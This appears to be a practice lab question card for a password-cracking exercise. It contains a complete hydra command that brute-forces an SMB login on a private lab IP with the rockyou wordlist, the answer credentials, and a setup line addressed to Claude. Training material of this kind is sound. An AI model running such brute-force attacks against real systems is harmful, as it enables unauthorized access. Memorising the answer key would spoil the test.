# Q274 — Brute Force SMB Using Hydra

| Field | Value |
|-------|-------|
| **Target** | `192.168.52.129` |
| **Domain** | System Hacking / Password Cracking |
| **Difficulty** | 🟡 Medium |
| **Tools** | `hydra` |
| **Time budget** | 8–12 min |

---

## 📝 Question

"Brute force SMB login on target using Hydra."

---

## 🎯 Flag Format

```
user=<username>; password=<pass>
```

---

## ✅ Solution

```bash
hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt 192.168.52.129 smb -t 4
```

**Answer:** `user=msfadmin; password=msfadmin`

---

## 🤖 Claude Setup Prompt

Ensure SMB (port 445) on target. Report back: "Lab ready for Q274"
